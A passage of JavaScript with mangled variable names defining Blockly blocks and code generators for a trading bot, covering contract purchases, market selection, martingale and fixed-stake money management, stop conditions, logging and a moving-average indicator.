  var _0x3cf5d0 = _0x567528 == "activemarket" ? "mainSymbol" : _0x567528 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x567528.split("|")[0] + "\"";
  var _0x2822ae = _0x542a43.getFieldValue("account_nya");
  var _0x3d5464 = _0x542a43.getFieldValue("stakeAM_nya");
  var _0x659a4c = _0x5db9ac.valueToCode(_0x542a43, "stake_nya", javascript.Order.ATOMIC);
  if (_0x659a4c.toString().length == 0) {
    _0x659a4c = 1;
  }
  ;
  var _0x48a92b = _0x542a43.getFieldValue("selmultipliermultiply_nya");
  var _0x2f1c17 = _0x5db9ac.valueToCode(_0x542a43, "limittp_nya", javascript.Order.ATOMIC);
  var _0x18b56d = _0x5db9ac.valueToCode(_0x542a43, "limitsl_nya", javascript.Order.ATOMIC);
  var _0x295b55 = "mainPurchase(\"" + _0x2822ae + "\",\"" + _0x3d5464 + "\"," + _0x659a4c + ",\"" + _0x1b3520 + "\"," + _0x3cf5d0 + ",0,\"t\",0,0,0,0,0,0,0,0,0,\"" + _0x48a92b + "\"," + _0x2f1c17 + "," + _0x18b56d + ");";
  return _0x295b55;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_vanillalongcall_vanillalongput",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Vanilla Long Call", "VANILLALONGCALL"], ["Vanilla Long Put", "VANILLALONGPUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_vanillalongcall_vanillalongput = function (_0x37ab94, _0x69da7) {
  var _0x4602c2 = _0x37ab94.getFieldValue("selcontract_nya");
  var _0x32e564 = _0x37ab94.getFieldValue("market_nya");
  var _0x3fae6a = _0x32e564 == "activemarket" ? "mainSymbol" : _0x32e564 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x32e564.split("|")[0] + "\"";
  var _0x31123c = _0x37ab94.getFieldValue("account_nya");
  var _0x45b91a = _0x37ab94.getFieldValue("stakeAM_nya");
  var _0x7ca9ba = _0x69da7.valueToCode(_0x37ab94, "stake_nya", javascript.Order.ATOMIC);
  if (_0x7ca9ba.toString().length == 0) {
    _0x7ca9ba = 1;
  }
  ;
  var _0xbbd38b = _0x37ab94.getFieldValue("seldurationunit_nya");
  var _0x1d7f01 = _0x69da7.valueToCode(_0x37ab94, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x1730c0 = _0x69da7.valueToCode(_0x37ab94, "barrier_nya", javascript.Order.ATOMIC);
  var _0x32f30a = "mainPurchase(\"" + _0x31123c + "\",\"" + _0x45b91a + "\"," + _0x7ca9ba + ",\"" + _0x4602c2 + "\"," + _0x3fae6a + "," + _0x1d7f01 + ",\"" + _0xbbd38b + "\"," + _0x1730c0 + ",0,0,0,0,0,0,0,0,0,0,0);";
  return _0x32f30a;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_turboslong_turbosshort",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Turbos Long", "TURBOSLONG"], ["Turbos Short", "TURBOSSHORT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_turboslong_turbosshort = function (_0x20ade4, _0x345976) {
  var _0x68c718 = _0x20ade4.getFieldValue("selcontract_nya");
  var _0xd3d1ff = _0x20ade4.getFieldValue("market_nya");
  var _0xc5ee0d = _0xd3d1ff == "activemarket" ? "mainSymbol" : _0xd3d1ff == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0xd3d1ff.split("|")[0] + "\"";
  var _0x3b8b38 = _0x20ade4.getFieldValue("account_nya");
  var _0x557193 = _0x20ade4.getFieldValue("stakeAM_nya");
  var _0x5de311 = _0x345976.valueToCode(_0x20ade4, "stake_nya", javascript.Order.ATOMIC);
  if (_0x5de311.toString().length == 0) {
    _0x5de311 = 1;
  }
  ;
  var _0x3edc3b = _0x20ade4.getFieldValue("seldurationunit_nya");
  var _0x35f1f1 = _0x345976.valueToCode(_0x20ade4, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x25ba71 = _0x345976.valueToCode(_0x20ade4, "barrier_nya", javascript.Order.ATOMIC);
  var _0x362b33 = "mainPurchase(\"" + _0x3b8b38 + "\",\"" + _0x557193 + "\"," + _0x5de311 + ",\"" + _0x68c718 + "\"," + _0xc5ee0d + "," + _0x35f1f1 + ",\"" + _0x3edc3b + "\"," + _0x25ba71 + ",0,0,0,0,0,0,0,0,0,0,0);";
  return _0x362b33;
};
Blockly.defineBlocksWithJsonArray([{
  type: "write_log",
  message0: "Notify %1 Sound: %2 %3",
  args0: [{
    type: "field_dropdown",
    name: "color_nya",
    options: [["No Color", ""], ["Blue", "42a5f5"], ["Red", "f44336"], ["Green", "04AA6D"], ["Yellow", "ffbf00"]]
  }, {
    type: "field_dropdown",
    name: "sound_nya",
    options: [["Silent", "silent"], ["Announcement", "announcement"], ["Earned money", "earned-money"], ["Job done", "job-done"], ["Error", "error"], ["Severe error", "severe-error"]]
  }, {
    type: "input_value",
    name: "log_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.write_log = function (_0x464a10, _0x8fecee) {
  var _0x230a5b = _0x8fecee.valueToCode(_0x464a10, "log_nya", javascript.Order.ATOMIC);
  var _0xeb3225 = _0x464a10.getFieldValue("color_nya");
  var _0x2b7db9 = _0x464a10.getFieldValue("sound_nya");
  var _0x19f18e;
  if (_0x2b7db9 == "silent") {
    _0x19f18e = "";
  } else {
    _0x19f18e = "document.getElementById(\"" + _0x2b7db9 + "\").play();";
  }
  _0x19f18e += "writeLog(\"#" + _0xeb3225 + "\"," + _0x230a5b + ");";
  return _0x19f18e;
};
let arrPopulatedMarket = [["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"], ["Continuous Indices:Volatility 150 (1s) Index", "1HZ150V|Volatility 150 (1s) Index"], ["Continuous Indices:Volatility 250 (1s) Index", "1HZ250V|Volatility 250 (1s) Index"], ["Daily Reset Indices:Bear Market Index", "RDBEAR|Bear Market Index"], ["Daily Reset Indices:Bull Market Index", "RDBULL|Bull Market Index"], ["Jump Indices:Jump 10 Index", "JD10|Jump 10 Index"], ["Jump Indices:Jump 25 Index", "JD25|Jump 25 Index"], ["Jump Indices:Jump 50 Index", "JD50|Jump 50 Index"], ["Jump Indices:Jump 75 Index", "JD75|Jump 75 Index"], ["Jump Indices:Jump 100 Index", "JD100|Jump 100 Index"], ["Step Indices:Step Index", "stpRNG|Step Index"], ["Crash/Boom Indices:Crash 300 Index", "CRASH300N|Crash 300 Index"], ["Crash/Boom Indices:Crash 500 Index", "CRASH500|Crash 500 Index"], ["Crash/Boom Indices:Crash 1000 Index", "CRASH1000|Crash 1000 Index"], ["Crash/Boom Indices:Boom 300 Index", "BOOM300N|Boom 300 Index"], ["Crash/Boom Indices:Boom 500 Index", "BOOM500|Boom 500 Index"], ["Crash/Boom Indices:Boom 1000 Index", "BOOM1000|Boom 1000 Index"], ["Major Pairs:AUD/JPY", "frxAUDJPY|AUD/JPY"], ["Major Pairs:AUD/USD", "frxAUDUSD|AUD/USD"], ["Major Pairs:EUR/AUD", "frxEURAUD|EUR/AUD"], ["Major Pairs:EUR/CHF", "frxEURCHF|EUR/CHF"], ["Major Pairs:EUR/GBP", "frxEURGBP|EUR/GBP"], ["Major Pairs:EUR/JPY", "frxEURJPY|EUR/JPY"], ["Major Pairs:EUR/USD", "frxEURUSD|EUR/USD"], ["Major Pairs:GBP/AUD", "frxGBPAUD|GBP/AUD"], ["Major Pairs:GBP/JPY", "frxGBPJPY|GBP/JPY"], ["Major Pairs:GBP/USD", "frxGBPUSD|GBP/USD"], ["Major Pairs:USD/CAD", "frxUSDCAD|USD/CAD"], ["Major Pairs:USD/CHF", "frxUSDCHF|USD/CHF"], ["Major Pairs:USD/JPY", "frxUSDJPY|USD/JPY"], ["Minor Pairs:AUD/CAD", "frxAUDCAD|AUD/CAD"], ["Minor Pairs:AUD/CHF", "frxAUDCHF|AUD/CHF"], ["Minor Pairs:AUD/NZD", "frxAUDNZD|AUD/NZD"], ["Minor Pairs:EUR/NZD", "frxEURNZD|EUR/NZD"], ["Minor Pairs:GBP/CAD", "frxGBPCAD|GBP/CAD"], ["Minor Pairs:GBP/CHF", "frxGBPCHF|GBP/CHF"], ["Minor Pairs:GBP/NOK", "frxGBPNOK|GBP/NOK"], ["Minor Pairs:GBP/NZD", "frxGBPNZD|GBP/NZD"], ["Minor Pairs:NZD/JPY", "frxNZDJPY|NZD/JPY"], ["Minor Pairs:NZD/USD", "frxNZDUSD|NZD/USD"], ["Minor Pairs:USD/MXN", "frxUSDMXN|USD/MXN"], ["Minor Pairs:USD/NOK", "frxUSDNOK|USD/NOK"], ["Minor Pairs:USD/PLN", "frxUSDPLN|USD/PLN"], ["Minor Pairs:USD/SEK", "frxUSDSEK|USD/SEK"], ["Asian indices:Australia 200", "OTC_AS51|Australia 200"], ["Asian indices:Hong Kong 50", "OTC_HSI|Hong Kong 50"], ["Asian indices:Japan 225", "OTC_N225|Japan 225"], ["European indices:Euro 50", "OTC_SX5E|Euro 50"], ["European indices:France 40", "OTC_FCHI|France 40"], ["European indices:Germany 40", "OTC_GDAXI|Germany 40"], ["European indices:Netherlands 25", "OTC_AEX|Netherlands 25"], ["European indices:Swiss 20", "OTC_SSMI|Swiss 20"], ["European indices:UK 100", "OTC_FTSE|UK 100"], ["American indices:US 500", "OTC_SPC|US 500"], ["American indices:US Tech 100", "OTC_NDX|US Tech 100"], ["American indices:Wall Street 30", "OTC_DJI|Wall Street 30"], ["Forex Basket:AUD Basket", "WLDAUD|AUD Basket"], ["Forex Basket:EUR Basket", "WLDEUR|EUR Basket"], ["Forex Basket:GBP Basket", "WLDGBP|GBP Basket"], ["Forex Basket:USD Basket", "WLDUSD|USD Basket"], ["Commodities Basket:Gold Basket", "WLDXAU|Gold Basket"], ["Metals:Gold/USD", "frxXAUUSD|Gold/USD"], ["Metals:Palladium/USD", "frxXPDUSD|Palladium/USD"], ["Metals:Platinum/USD", "frxXPTUSD|Platinum/USD"], ["Metals:Silver/USD", "frxXAGUSD|Silver/USD"], ["Cryptocurrencies:BTC/USD", "cryBTCUSD|BTC/USD"], ["Cryptocurrencies:ETH/USD", "cryETHUSD|ETH/USD"]];
Blockly.defineBlocksWithJsonArray([{
  type: "setmarket",
  message0: "Set Market to: %1",
  args0: [{
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmarket = function (_0x302dec, _0x2463f9) {
  var _0x29c6d1 = _0x302dec.getFieldValue("market_nya");
  var _0x50027b = "if(mainSymbol!=\"" + _0x29c6d1.split("|")[0] + "\"){mainSymbol=\"" + _0x29c6d1.split("|")[0] + "\";document.getElementById(\"lblMarket\").innerText=\"" + _0x29c6d1.split("|")[1] + "\";forgetAllTicks();};";
  return _0x50027b;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtosmartmartingale",
  message0: "Set Money Management to Martingale %1 Back to initial stake ONLY after previous loss covered: %2 %3 Initial Stake: %4 Martingale Factor: %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_smart_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "initialstake_nya"
  }, {
    type: "input_value",
    name: "martingalefactor_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtosmartmartingale = function (_0x1fb793, _0x125dc9) {
  var _0x49c7fe = _0x1fb793.getFieldValue("check_smart_nya") === "TRUE";
  var _0x18da66 = _0x125dc9.valueToCode(_0x1fb793, "initialstake_nya", javascript.Order.ATOMIC);
  var _0x442cbf = _0x125dc9.valueToCode(_0x1fb793, "martingalefactor_nya", javascript.Order.ATOMIC);
  var _0x262916 = "selMoneyManagement.value=\"smartmartingale\";inpInitStake.value=" + _0x18da66 + ";inpMartiFactor.value=" + _0x442cbf + ";chkSmart.checked=" + _0x49c7fe + ";selMoneyManagementChanged();";
  return _0x262916;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtosmartcyclestake",
  message0: "Set Money Management to Smart Cycle Stake %1 Back to initial stake ONLY after previous loss covered: %2 %3 Cycle Stake: %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_smart_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "cyclestake_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtosmartcyclestake = function (_0x349d83, _0x4365cb) {
  var _0x47df42 = _0x349d83.getFieldValue("check_smart_nya") === "TRUE";
  var _0x3c3aaf = _0x4365cb.valueToCode(_0x349d83, "cyclestake_nya", javascript.Order.ATOMIC);
  var _0x2b77e1 = "selMoneyManagement.value=\"smartcyclestake\";inpCycleStake.value=" + _0x3c3aaf + ";chkSmart.checked=" + _0x47df42 + ";selMoneyManagementChanged();";
  return _0x2b77e1;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtofixedstake",
  message0: "Set Money Management to Fixed Stake %1 Fixed Stake: %2",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "fixedstake_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtofixedstake = function (_0x5077fa, _0x4895a2) {
  var _0x23df99 = _0x4895a2.valueToCode(_0x5077fa, "fixedstake_nya", javascript.Order.ATOMIC);
  var _0x207383 = "stakeNow=" + _0x23df99 + ";selMoneyManagement.value=\"fixedstake\";inpInitStake.value=" + _0x23df99 + ";selMoneyManagementChanged();";
  return _0x207383;
};
Blockly.defineBlocksWithJsonArray([{
  type: "settarget",
  message0: "Set Target (Stop Condition) %1 %2 Target Profit: %3 %4 Stop Loss: %5 %6 Number Of Win(s): %7 %8 Number Of Loss(es): %9 %10 Number Of Run(s): %11 %12 Win(s) In A Row: %13 %14 Loss(es) In A Row: %15",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_targetprofit_nya",
    checked: true
  }, {
    type: "input_value",
    name: "targetprofit_nya"
  }, {
    type: "field_checkbox",
    name: "check_stoploss_nya",
    checked: false
  }, {
    type: "input_value",
    name: "stoploss_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofwins_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofwins_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberoflosses_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberoflosses_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofruns_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofruns_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofwinsinarow_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofwinsinarow_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberoflossesinarow_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberoflossesinarow_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.settarget = function (_0x6af67c, _0x162260) {
  var _0x4887a8 = _0x6af67c.getFieldValue("check_targetprofit_nya") === "TRUE";
  var _0x3b9570 = _0x162260.valueToCode(_0x6af67c, "targetprofit_nya", javascript.Order.ATOMIC);
  var _0x45500f = _0x6af67c.getFieldValue("check_stoploss_nya") === "TRUE";
  var _0x2c0fdd = _0x162260.valueToCode(_0x6af67c, "stoploss_nya", javascript.Order.ATOMIC);
  var _0x5d0a9d = _0x6af67c.getFieldValue("check_numberofwins_nya") === "TRUE";
  var _0x847074 = _0x162260.valueToCode(_0x6af67c, "numberofwins_nya", javascript.Order.ATOMIC);
  var _0x12b65e = _0x6af67c.getFieldValue("check_numberoflosses_nya") === "TRUE";
  var _0x499662 = _0x162260.valueToCode(_0x6af67c, "numberoflosses_nya", javascript.Order.ATOMIC);
  var _0x55e9e1 = _0x6af67c.getFieldValue("check_numberofruns_nya") === "TRUE";
  var _0x153fbd = _0x162260.valueToCode(_0x6af67c, "numberofruns_nya", javascript.Order.ATOMIC);
  var _0x44683a = _0x6af67c.getFieldValue("check_numberofwinsinarow_nya") === "TRUE";
  var _0x314a7e = _0x162260.valueToCode(_0x6af67c, "numberofwinsinarow_nya", javascript.Order.ATOMIC);
  var _0x42c777 = _0x6af67c.getFieldValue("check_numberoflossesinarow_nya") === "TRUE";
  var _0x5a2581 = _0x162260.valueToCode(_0x6af67c, "numberoflossesinarow_nya", javascript.Order.ATOMIC);
  var _0x3a8e9c = "chkTP.checked=" + _0x4887a8 + ";inpTP.value=" + _0x3b9570 + ";chkSL.checked=" + _0x45500f + ";inpSL.value=" + _0x2c0fdd + ";chkNumOfWin.checked=" + _0x5d0a9d + ";inpNumOfWin.value=" + _0x847074 + ";chkNumOfLoss.checked=" + _0x12b65e + ";inpNumOfLoss.value=" + _0x499662 + ";chkNumOfRun.checked=" + _0x55e9e1 + ";inpNumOfRun.value=" + _0x153fbd + ";chkNumOfWinInARow.checked=" + _0x44683a + ";inpNumOfWinInARow.value=" + _0x314a7e + ";chkNumOfLossInARow.checked=" + _0x42c777 + ";inpNumOfLossInARow.value=" + _0x5a2581 + ";";
  return _0x3a8e9c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setvirtuallose",
  message0: "Set Virtual Lose %1 %2 Virtual Lose: %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_virtuallose_nya",
    checked: true
  }, {
    type: "input_value",
    name: "virtuallose_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setvirtuallose = function (_0x39ac20, _0x4dbfeb) {
  var _0x42804f = _0x39ac20.getFieldValue("check_virtuallose_nya") === "TRUE";
  var _0x3d4ccf = _0x4dbfeb.valueToCode(_0x39ac20, "virtuallose_nya", javascript.Order.ATOMIC);
  var _0x1bd4bc = "chkVLose.checked=" + _0x42804f + ";inpVLose.value=" + _0x3d4ccf + ";cekValidasiSlaveToken();";
  return _0x1bd4bc;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setadditionalsettings",
  message0: "Set Additional Settings %1 %2 Delay After Win (seconds): %3 %4 Delay After Lose (seconds): %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_delayafterwin_nya",
    checked: false
  }, {
    type: "input_value",
    name: "delayafterwin_nya"
  }, {
    type: "field_checkbox",
    name: "check_delayafterlose_nya",
    checked: true
  }, {
    type: "input_value",
    name: "delayafterlose_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setadditionalsettings = function (_0x52b975, _0x114d3a) {
  var _0x212531 = _0x52b975.getFieldValue("check_delayafterwin_nya") === "TRUE";
  var _0x5948d0 = _0x52b975.getFieldValue("delayafterwin_nya");
  var _0x132eee = _0x52b975.getFieldValue("check_delayafterlose_nya") === "TRUE";
  var _0x27c069 = _0x52b975.getFieldValue("delayafterlose_nya");
  var _0x4c96db = "chkDelayWin.checked=" + _0x212531 + ";inpDelayWin.value=" + _0x5948d0 + ";chkDelayLose.checked=" + _0x132eee + ";inpDelayLose.value=" + _0x27c069 + ";";
  return _0x4c96db;
};
Blockly.defineBlocksWithJsonArray([{
  type: "resultis",
  message0: "Result is %1",
  args0: [{
    type: "field_dropdown",
    name: "result_nya",
    options: [["Win", "win"], ["Loss", "loss"], ["Virtual Win", "virtualwin"], ["Virtual Loss", "virtualloss"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.resultis = function (_0x4fec3b, _0x11e7cb) {
  var _0x52497a = _0x4fec3b.getFieldValue("result_nya");
  var _0x4a1755 = "lastCont_result==\"" + _0x52497a + "\"";
  return [_0x4a1755, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "readyfortrade",
  message0: "Ready For Trade",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: "",
  extensions: ["readyfortrade_onchange"]
}]);
javascript.javascriptGenerator.forBlock.readyfortrade = function (_0x51686c, _0x248ce7) {
  var _0x41b116 = "izinRun2=true;";
  return _0x41b116;
};
Blockly.Extensions.register("readyfortrade_onchange", function () {
  this.setOnChange(function (_0x50ae96) {
    if (this.workspace.isDragging()) {
      return;
    }
    let _0x57c824;
    let _0x2851d2;
    _0x57c824 = this.getSurroundParent();
    _0x2851d2 = false;
    while (_0x57c824 !== null) {
      if (_0x57c824.type === "runonceatstart") {
        _0x2851d2 = true;
        break;
      }
      ;
      _0x57c824 = _0x57c824.getSurroundParent();
    }
    if (!_0x2851d2) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Ready For Trade\" must inside BLOCK 1");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "checkagain",
  message0: "Check Again",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: "",
  extensions: ["checkagain_onchange"]
}]);
javascript.javascriptGenerator.forBlock.checkagain = function (_0x4137d7, _0x514449) {
  var _0x548e13 = "izinRun2=true;";
  return _0x548e13;
};
Blockly.Extensions.register("checkagain_onchange", function () {
  this.setOnChange(function (_0x35499d) {
    if (this.workspace.isDragging()) {
      return;
    }
    let _0x500516;
    let _0x574dec;
    _0x500516 = this.getSurroundParent();
    _0x574dec = false;
    while (_0x500516 !== null) {
      if (_0x500516.type === "purchaseconditions") {
        _0x574dec = true;
        break;
      }
      ;
      _0x500516 = _0x500516.getSurroundParent();
    }
    if (!_0x574dec) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Check Again\" must inside BLOCK 2");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "tradeagain",
  message0: "Trade Again",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: "",
  extensions: ["tradeagain_onchange"]
}]);
javascript.javascriptGenerator.forBlock.tradeagain = function (_0x1d9d49, _0x6fd05d) {
  var _0x5c569d = "izinRun2=true;";
  return _0x5c569d;
};
Blockly.Extensions.register("tradeagain_onchange", function () {
  this.setOnChange(function (_0x853c86) {
    if (this.workspace.isDragging()) {
      return;
    }
    let _0x5b77d8;
    let _0xbe74f3;
    _0x5b77d8 = this.getSurroundParent();
    _0xbe74f3 = false;
    while (_0x5b77d8 !== null) {
      if (_0x5b77d8.type === "restarttradingconditions") {
        _0xbe74f3 = true;
        break;
      }
      ;
      _0x5b77d8 = _0x5b77d8.getSurroundParent();
    }
    if (!_0xbe74f3) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Trade Again\" must inside BLOCK 4");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "stopbot",
  message0: "Stop Robot",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.stopbot = function (_0x7721a8, _0x11a867) {
  var _0x33391c = "if(btn_run.src.split(\"/\").pop() == \"icon_stop.png\"){btn_run.click();}";
  return _0x33391c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "balance",
  message0: "Balance: %1",
  args0: [{
    type: "field_dropdown",
    name: "tipe_nya",
    options: [["Number", "number"], ["String", "string"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.balance = function (_0x11267a, _0x441dba) {
  var _0x4141bc = _0x11267a.getFieldValue("tipe_nya");
  var _0x5a2227 = "";
  if (_0x4141bc == "string") {
    _0x5a2227 = "\"" + summary_balance.innerText.split(" ")[0] + "\"";
  } else {
    _0x5a2227 = "summary_balance.innerText.split(\" \")[0]*1";
  }
  return [_0x5a2227, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "summary",
  message0: "Summary: %1",
  args0: [{
    type: "field_dropdown",
    name: "data_nya",
    options: [["No. Of Runs", "noofruns"], ["Total Stake", "totalstake"], ["Total Payout", "totalpayout"], ["No. Of Win(s)", "win"], ["No. Of Loss(es)", "loss"], ["Total Profit/Loss", "totalprofitloss"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.summary = function (_0x1a092e, _0x2940cd) {
  var _0x588e7e = _0x1a092e.getFieldValue("data_nya");
  var _0x5bfe8b = "summary_" + _0x588e7e + ".innerText*1";
  return [_0x5bfe8b, Blockly.JavaScript.ORDER_NONE];
};
const sleep = _0x4d381f => {
  return new Promise(_0x4380c8 => // TOLOOK
  setTimeout(_0x4380c8, _0x4d381f));
};
Blockly.defineBlocksWithJsonArray([{
  type: "runafter",
  message0: "%1 Run After %2 Second(s)",
  args0: [{
    type: "input_statement",
    name: "statement_nya"
  }, {
    type: "input_value",
    name: "seconds_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.runafter = function (_0x37d1bc, _0x5f3725) {
  var _0x4b5dc7 = _0x5f3725.statementToCode(_0x37d1bc, "statement_nya");
  var _0x47be74 = _0x5f3725.valueToCode(_0x37d1bc, "seconds_nya", javascript.Order.ATOMIC);
  var _0x184dc1 = "sleep(" + _0x47be74 * 1000 + ").then(() => {" + _0x4b5dc7 + ";})";
  return _0x184dc1;
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorsmaarray",
  message0: "Simple Moving Average Array %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorsmaarray = function (_0x2ed966, _0x1f20c7) {
  var _0x26f14b = _0x1f20c7.valueToCode(_0x2ed966, "inputlist_nya", javascript.Order.ATOMIC);
  var _0x194531 = _0x1f20c7.valueToCode(_0x2ed966, "period_nya", javascript.Order.ATOMIC);
  var _0x974b54 = "calculateMovingAverage(" + _0x26f14b + "," + _0x194531 + ")";
